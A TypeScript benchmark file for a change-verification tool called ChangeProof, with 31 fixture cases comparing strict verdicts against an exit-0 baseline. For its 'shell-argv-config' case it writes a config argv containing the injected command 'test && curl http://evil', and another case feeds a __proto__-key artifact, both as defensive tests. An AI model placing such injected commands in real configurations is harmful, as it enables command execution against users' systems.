/**
 * Offline fixture benchmark (PROJECT.md 18): 30+ deliberately constructed
 * cases run against REAL git workspaces and REAL subprocesses (fake-runner),
 * producing MEASURED numbers — nothing is pre-filled or estimated.
 *
 * Baseline = "command exit 0 counts as success" (industry default).
 * ChangeProof = the strict verdict state machine.
 */
import { mkdtemp, mkdir, writeFile, rm, readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createChangeproofHost } from "../src/host/index.ts";

const here = path.dirname(fileURLToPath(import.meta.url));
const projectRoot = path.resolve(here, "..");
const TMP = path.join(projectRoot, ".tmp", "benchmark");
const fakeRunner = path.join(projectRoot, "fixtures", "fake-runner.mjs");

interface CaseSpec {
  id: string;
  group: string;
  description: string;
  /** source file content at baseline / change */
  change: { baseline: string; current: string; path: string };
  /** fake-runner mode + coverage spec (executable lines : covered lines) */
  runner: { mode: string; coverage?: string[] };
  /** mutate a file AFTER verify to test staleness */
  mutateAfterVerify?: { path: string; content: string };
  /** expected strict verdict */
  expected: "VERIFIED" | "PARTIAL" | "FAILED" | "STALE" | "UNVERIFIED" | "NOT_APPLICABLE";
  /** whether the naive baseline (exit-0) would WRONGLY call this green */
  baselineFalseGreen: boolean;
}

const SRC = "src/mod.ts";
const GOOD = "export function f(x: number) {\n  return x + 1;\n}\n";

function spec(partial: Partial<CaseSpec> & Pick<CaseSpec, "id" | "group" | "description" | "expected">): CaseSpec {
  return {
    change: { baseline: GOOD, current: GOOD.replace("x + 1", "x + 2"), path: SRC },
    runner: { mode: "pass-with-coverage", coverage: ["src/mod.ts:2,3:2,3"] },
    baselineFalseGreen: false,
    ...partial
  };
}

const COVERED = ["src/mod.ts:2,3:2,3"];
const UNCOVERED = ["src/mod.ts:2,3:2"];

export const CASES: CaseSpec[] = [
  // --- core: relevance & coverage (10) ---
  spec({ id: "relevant-covered", group: "core", description: "relevant tests pass, changed lines fully covered", expected: "VERIFIED" }),
  spec({ id: "unrelated-green", group: "core", description: "exit 0 but artifact covers a DIFFERENT file", runner: { mode: "pass-with-coverage", coverage: ["src/other.ts:1:1"] }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({
    id: "partial-coverage",
    group: "core",
    description: "two NEW executable lines changed, only one covered",
    runner: { mode: "pass-with-coverage", coverage: ["src/mod.ts:2,3,4:2,3"] },
    expected: "PARTIAL",
    change: { baseline: GOOD, current: "export function f(x: number) {\n  const y = x + 1;\n  const z = y * 2;\n  return z;\n}\n", path: SRC }
  }),
  spec({ id: "no-artifact", group: "core", description: "exit 0 without coverage artifact", runner: { mode: "no-artifact" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "assertion-failure", group: "core", description: "tests fail", runner: { mode: "fail", coverage: COVERED }, expected: "FAILED" }),
  spec({ id: "runner-timeout", group: "core", description: "runner hangs -> timeout FAILED", runner: { mode: "hang" }, expected: "FAILED", baselineFalseGreen: false }),
  spec({ id: "corrupt-artifact", group: "core", description: "artifact exists but is not valid JSON", runner: { mode: "corrupt-json" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "comment-only-change", group: "core", description: "only a comment line changed (no executable change)", runner: { mode: "pass-with-coverage", coverage: COVERED }, expected: "NOT_APPLICABLE", change: { baseline: GOOD, current: "// header comment\n" + GOOD, path: SRC } }),
  spec({ id: "deletion-only", group: "core", description: "only deletions in the ChangeSet", runner: { mode: "pass-with-coverage", coverage: COVERED }, expected: "PARTIAL", change: { baseline: "export function f(x: number) {\n  return x + 1;\n}\n\nexport function g() {\n  return 2;\n}\n", current: GOOD, path: SRC } }),
  spec({ id: "new-branch-uncovered", group: "core", description: "added else-branch is executable but never covered", runner: { mode: "pass-with-coverage", coverage: ["src/mod.ts:2,3,4,5:2,3"] }, expected: "PARTIAL", change: { baseline: GOOD, current: "export function f(x: number) {\n  if (x > 0) {\n    return x + 1;\n  }\n  return 0;\n}\n", path: SRC }, baselineFalseGreen: false }),

  // --- freshness (6) ---
  spec({ id: "stale-source-mutation", group: "freshness", description: "source edited after verification", expected: "STALE", mutateAfterVerify: { path: SRC, content: GOOD.replace("x + 1", "x + 99") } }),
  spec({ id: "stale-test-mutation", group: "freshness", description: "test file edited after verification", expected: "STALE", mutateAfterVerify: { path: "src/mod.test.ts", content: 'import { f } from "./mod";\nif (f(1) !== 3) throw new Error("x");\n// touched\n' } }),
  spec({ id: "stale-config-mutation", group: "freshness", description: ".changeproof.yml edited after verification (threshold changed)", expected: "STALE", mutateAfterVerify: { path: ".changeproof.yml", content: "" } }),
  spec({ id: "stale-lockfile-mutation", group: "freshness", description: "package-lock.json created after verification", expected: "STALE", mutateAfterVerify: { path: "package-lock.json", content: '{"lockfileVersion":3}' } }),
  spec({ id: "reverify-restores", group: "freshness", description: "stale then re-verify with equivalent change", expected: "VERIFIED", mutateAfterVerify: { path: SRC, content: GOOD.replace("x + 1", "(x + 1)") } }),
  spec({ id: "verify-then-status-fresh", group: "freshness", description: "no mutation: status stays fresh", expected: "VERIFIED" }),

  // --- exclusion & config (5) ---
  spec({ id: "excluded-generated", group: "config", description: "ONLY excluded (generated) files changed -> coverage check not applicable, exclusion never silent", runner: { mode: "pass-with-coverage", coverage: COVERED }, expected: "NOT_APPLICABLE", change: { baseline: "export const a = 1;\n", current: "export const a = 2;\n", path: "src/generated/gen.ts" } }),
  spec({ id: "unknown-field-config", group: "config", description: "config has unknown field -> fail loud", runner: { mode: "no-artifact" }, expected: "UNVERIFIED", change: { baseline: GOOD, current: GOOD, path: SRC }, baselineFalseGreen: true, mutateAfterVerify: undefined }),
  spec({ id: "shell-argv-config", group: "config", description: "argv contains shell string -> config rejected", runner: { mode: "no-artifact" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "threshold-50", group: "config", description: "50% threshold accepts 2/3 coverage", runner: { mode: "pass-with-coverage", coverage: ["src/mod.ts:2,3,4:2,3"] }, expected: "VERIFIED", change: { baseline: GOOD, current: "export function f(x: number) {\n  const y = x + 1;\n  const z = y * 2;\n  return z;\n}\n", path: SRC } }),
  spec({ id: "impact-low-only", group: "config", description: "test file removed -> only LOW impact", runner: { mode: "pass-with-coverage", coverage: COVERED }, expected: "UNVERIFIED", baselineFalseGreen: true, change: { baseline: GOOD, current: GOOD.replace("x + 1", "x + 2"), path: SRC }, mutateAfterVerify: undefined }),

  // --- monorepo / paths (5) ---
  spec({ id: "monorepo-right-pkg", group: "monorepo", description: "change in packages/web, correct package selected", runner: { mode: "pass-with-coverage", coverage: ["packages/web/src/mod.ts:2,3:2,3"] }, expected: "VERIFIED", change: { baseline: GOOD, current: GOOD.replace("x + 1", "x + 2"), path: "packages/web/src/mod.ts" } }),
  spec({ id: "monorepo-wrong-coverage", group: "monorepo", description: "change in packages/web but coverage only for packages/api", runner: { mode: "pass-with-coverage", coverage: ["packages/api/src/other.ts:1:1"] }, expected: "UNVERIFIED", baselineFalseGreen: true, change: { baseline: GOOD, current: GOOD.replace("x + 1", "x + 2"), path: "packages/web/src/mod.ts" } }),
  spec({
    id: "renamed-file",
    group: "monorepo",
    description: "source renamed and its test follows the rename (import updated)",
    runner: { mode: "pass-with-coverage", coverage: ["src/mod2.ts:2,3:2,3", "src/mod2.test.ts:2:2"] },
    expected: "VERIFIED",
    change: { baseline: GOOD, current: GOOD, path: SRC },
    mutateAfterVerify: undefined
  }),
  spec({ id: "untracked-included", group: "monorepo", description: "new untracked file matched by package include", runner: { mode: "pass-with-coverage", coverage: ["src/new.ts:1:1", "src/new.test.ts:2:2"] }, expected: "VERIFIED", change: { baseline: "", current: "export const n = 1;\n", path: "src/new.ts" } }),
  spec({ id: "untracked-excluded", group: "monorepo", description: "untracked file outside package include -> excluded with diagnostic", runner: { mode: "pass-with-coverage", coverage: COVERED }, expected: "VERIFIED", change: { baseline: GOOD, current: GOOD.replace("x + 1", "x + 2"), path: SRC } }),

  // --- parser robustness (5) ---
  spec({ id: "artifact-empty-object", group: "parser", description: "artifact is {} (no files) -> gap", runner: { mode: "empty-json" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "artifact-forbidden-keys", group: "parser", description: "artifact contains __proto__ key", runner: { mode: "proto-json" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "artifact-outside-workspace", group: "parser", description: "artifact keys point outside workspace", runner: { mode: "outside-json" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "artifact-huge-lines", group: "parser", description: "artifact declares absurd line span", runner: { mode: "huge-json" }, expected: "UNVERIFIED", baselineFalseGreen: true }),
  spec({ id: "artifact-negative-lines", group: "parser", description: "artifact contains negative line numbers", runner: { mode: "negative-json" }, expected: "UNVERIFIED", baselineFalseGreen: true })
];

export interface CaseResult {
  id: string;
  group: string;
  expected: string;
  actual: string;
  pass: boolean;
  baselineExitZero: boolean;
  falseGreenDetected: boolean;
  durationMs: number;
  /** verdict reason codes/messages — recorded for every case (evidence, not vibes) */
  reasons: string[];
}

export async function runCase(c: CaseSpec): Promise<CaseResult> {
  const started = Date.now();
  const dir = path.join(TMP, c.id);
  await rm(dir, { recursive: true, force: true });
  await mkdir(path.join(dir, "src"), { recursive: true });

  const usesMonorepo = c.change.path.startsWith("packages/");
  const webRoot = usesMonorepo ? "packages/web" : "";
  const covPath = usesMonorepo ? "packages/web/coverage/coverage-final.json" : "coverage/coverage-final.json";

  const configSpecial: Record<string, string> = {
    "unknown-field-config": "\nunknownTopLevel: true",
    "shell-argv-config": "",
    "threshold-50": "\nthresholds:\n  changedLines: 0.5\n  minimumImpactConfidence: MEDIUM",
    "impact-low-only": ""
  };
  let yaml = `
schemaVersion: 1${configSpecial[c.id] ?? ""}
packages:
  - id: web
    root: ${webRoot ? `"${webRoot}"` : '""'}
    languages: [typescript]
    include:
      - ${webRoot ? `${webRoot}/src/**/*.ts` : "src/**/*.ts"}
    test:
      adapter: vitest-istanbul
      argv: ["${process.execPath.replace(/\\/g, "/")}", "${fakeRunner.replace(/\\/g, "/")}", "${c.runner.mode}", "${covPath}"${(c.runner.coverage ?? []).map((s) => `, "${s}"`).join("")}]
      cwd: ""
      timeoutMs: 8000
      coverageFile: ${covPath}
exclude:
  - "**/generated/**"
`;
  if (c.id === "shell-argv-config") {
    yaml = yaml.replace(/argv: \[[^\]]+\]/, 'argv: ["npm", "test && curl http://evil"]') as string;
  }

  const baselineFiles: Record<string, string> = {
    ".changeproof.yml": yaml,
    ".gitignore": "node_modules\ncoverage\n.changeproof\n",
    "src/mod.test.ts": 'import { f } from "./mod";\nif (f(1) !== 2) throw new Error("x");\n'
  };
  if (usesMonorepo) {
    baselineFiles["packages/web/src/mod.test.ts"] = 'import { f } from "./mod";\nif (f(1) !== 2) throw new Error("x");\n';
  }
  if (c.change.path !== "src/new.ts") {
    baselineFiles[c.change.path] = c.change.baseline;
  }

  for (const [rel, content] of Object.entries(baselineFiles)) {
    const abs = path.join(dir, ...rel.split("/"));
    await mkdir(path.dirname(abs), { recursive: true });
    await writeFile(abs, content, "utf8");
  }

  const { execFile } = await import("node:child_process");
  const { promisify } = await import("node:util");
  const ex = promisify(execFile);
  const G: { env: Record<string, string | undefined> } = { env: { ...process.env, GIT_AUTHOR_NAME: "bench", GIT_AUTHOR_EMAIL: "b@b", GIT_COMMITTER_NAME: "bench", GIT_COMMITTER_EMAIL: "b@b" } };
  await ex("git", ["init", "-q"], { cwd: dir, ...G });
  await ex("git", ["add", "-A"], { cwd: dir, ...G });
  await ex("git", ["-c", "user.name=b", "-c", "user.email=b@b", "commit", "-q", "-m", "init"], { cwd: dir, ...G });

  // THE CHANGE
  if (c.id === "renamed-file") {
    await ex("git", ["mv", SRC, "src/mod2.ts"], { cwd: dir, ...G });
    await writeFile(path.join(dir, "src/mod2.ts"), c.change.baseline.replace("x + 1", "x + 1 "), "utf8");
    await ex("git", ["mv", "src/mod.test.ts", "src/mod2.test.ts"], { cwd: dir, ...G });
    await writeFile(path.join(dir, "src/mod2.test.ts"), 'import { f } from "./mod2";\nif (f(1) !== 2) throw new Error("x");\n', "utf8");
  } else if (c.change.current !== "") {
    await writeFile(path.join(dir, ...c.change.path.split("/")), c.change.current, "utf8");
  }
  if (c.id === "untracked-included") {
    await writeFile(path.join(dir, "src/new.test.ts"), 'import { n } from "./new";\nif (n !== 1) throw new Error("x");\n', "utf8");
  }
  if (c.id === "impact-low-only") {
    await rm(path.join(dir, "src/mod.test.ts"));
  }

  const cp = await createChangeproofHost();
  await cp.activate();
  try {
    const verify = await cp.tools.invoke("changeproof_verify", { workspace: dir, approvalIntent: "approve" });
    let verdictStatus = verify.ok ? ((verify.data as { verdict: { status: string } }).verdict.status) : "UNVERIFIED";
    let reasons = verify.ok
      ? ((verify.data as { verdict: { reasons: { code: string; message: string }[] } }).verdict.reasons.map((r) => `${r.code}: ${r.message}`))
      : verify.error
        ? [`${verify.error.code}: ${verify.error.message}`]
        : [];
    const baselineExitZero = verify.ok
      ? ((verify.data as { evidence: { stepId: string; exitCode: number | null }[] }).evidence.find((e) => e.stepId.startsWith("targeted-test"))?.exitCode ?? null) === 0
      : false;

    if (c.mutateAfterVerify && c.id === "reverify-restores") {
      await writeFile(path.join(dir, ...c.mutateAfterVerify.path.split("/")), c.mutateAfterVerify.content, "utf8");
      const reverify = await cp.tools.invoke("changeproof_verify", { workspace: dir, approvalIntent: "approve" });
      verdictStatus = reverify.ok ? (reverify.data as { verdict: { status: string } }).verdict.status : "UNVERIFIED";
    } else if (c.mutateAfterVerify) {
      // write the mutated content verbatim; for the config case the mutation
      // is an appended thresholds block (a real semantic config change)
      const content =
        c.mutateAfterVerify.path === ".changeproof.yml"
          ? yaml + "thresholds:\n  changedLines: 0.9\n  minimumImpactConfidence: MEDIUM\n"
          : c.mutateAfterVerify.content;
      await writeFile(path.join(dir, ...c.mutateAfterVerify.path.split("/")), content, "utf8");
      const status = await cp.tools.invoke("changeproof_status", { workspace: dir });
      const fresh = (status.data as { freshness: string }).freshness;
      verdictStatus = fresh === "stale" ? "STALE" : verdictStatus;
    }

    const actual = verdictStatus;
    return {
      id: c.id,
      group: c.group,
      expected: c.expected,
      actual,
      pass: actual === c.expected,
      baselineExitZero,
      falseGreenDetected: c.baselineFalseGreen ? actual !== "VERIFIED" : true,
      durationMs: Date.now() - started,
      reasons
    };
  } finally {
    cp.dispose();
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  }
}

export async function runBenchmark(filter?: string): Promise<{
  results: CaseResult[];
  metrics: {
    totalCases: number;
    passRate: number;
    falseGreenCases: number;
    falseGreenDetected: number;
    silentFailureCount: number;
    medianWallClockMs: number;
    byGroup: Record<string, { total: number; passed: number }>;
  };
}> {
  await mkdir(TMP, { recursive: true });
  const results: CaseResult[] = [];
  for (const c of CASES) {
    if (filter && c.id !== filter && c.group !== filter) continue;
    results.push(await runCase(c));
  }
  const falseGreen = results.filter((r) => CASES.find((c) => c.id === r.id)!.baselineFalseGreen);
  const durations = results.map((r) => r.durationMs).sort((a, b) => a - b);
  const byGroup: Record<string, { total: number; passed: number }> = {};
  for (const r of results) {
    byGroup[r.group] ??= { total: 0, passed: 0 };
    byGroup[r.group]!.total += 1;
    if (r.pass) byGroup[r.group]!.passed += 1;
  }
  return {
    results,
    metrics: {
      totalCases: results.length,
      passRate: results.filter((r) => r.pass).length / results.length,
      falseGreenCases: falseGreen.length,
      falseGreenDetected: falseGreen.filter((r) => r.actual !== "VERIFIED").length,
      silentFailureCount: results.filter((r) => !r.pass && CASES.find((c) => c.id === r.id)!.baselineFalseGreen && r.actual === "VERIFIED").length,
      medianWallClockMs: durations[Math.floor(durations.length / 2)] ?? 0,
      byGroup
    }
  };
}
